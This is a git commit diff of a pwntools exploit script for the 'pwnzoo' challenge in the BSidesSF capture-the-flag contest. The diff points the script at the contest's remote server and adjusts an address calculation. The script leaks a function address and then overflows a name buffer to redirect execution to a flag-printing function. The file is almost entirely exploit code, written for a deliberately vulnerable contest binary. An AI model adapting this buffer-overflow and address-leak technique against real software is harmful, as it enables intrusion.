1e6669d511b18d2ac934edb43f7c45d6be007c2a
Your Name <you@example.com>
2021-03-16 08:11:43 -0700

    t

--- besidesf/pwnzoo/ex.py
+++ besidesf/pwnzoo/ex.py
@@ -2,20 +2,17 @@ from pwn import *
 context.update(log_level = 'debug')
 size_name = 0x24
 
-def Change(name):
-	p.sendlineafter(' Exit', '2')	
-	p.sendline(name)
-
-p = process('pwnzoo')
+#p = process('pwnzoo')
+p = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net',1234)
 p.sendlineafter('dog? ', 'd')
 p.sendline('a'*size_name)
 p.sendlineafter(' Exit', '1')
 addr_speak = u64(p.recvrepeat(1)[0x37:0x37+6].ljust(8, '\x00'))
 log.info('speak : ' + hex(addr_speak))
-addr_flag = addr_speak & 0xfffffffffffff23b
+addr_flag = (addr_speak&0xfffffffffffff000) | 0x23b
 log.info('flag : ' + hex(addr_flag))
 p.sendline('2')
+#raw_input('debug: ' + str(p.pid))
 p.sendline('a'*size_name + p64(addr_flag))
-raw_input('debug: ' + str(p.pid))
+p.sendlineafter(' Exit', '1')
 p.interactive()
-#Change('c'*size_name + p16(offset_flag))
